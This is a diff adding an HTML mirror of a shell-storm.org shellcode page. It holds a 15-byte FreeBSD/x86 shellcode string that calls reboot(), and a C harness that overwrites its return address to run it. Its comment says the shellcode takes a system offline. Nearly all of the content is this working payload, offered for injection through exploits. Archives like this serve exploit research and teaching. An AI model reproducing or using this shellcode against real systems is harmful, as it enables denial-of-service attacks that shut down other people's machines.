@@ -1,0 +1,37 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-677.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>FreeBSD/x86 - reboot() - 15 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+
+/*
+
+FreeBSD reboot() shellcode
+
+This will halt a system, which takes it offline until someone reboots it.
+
+Written by zillion (at safemode.org
+
+*/
+
+char shellcode[] =
+        &quot;\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80&quot;;
+
+int main()
+{
+
+  int *ret;
+  ret = (int *)&amp;ret + 2;
+  (*ret) = (int)shellcode;
+}
+
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-677.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
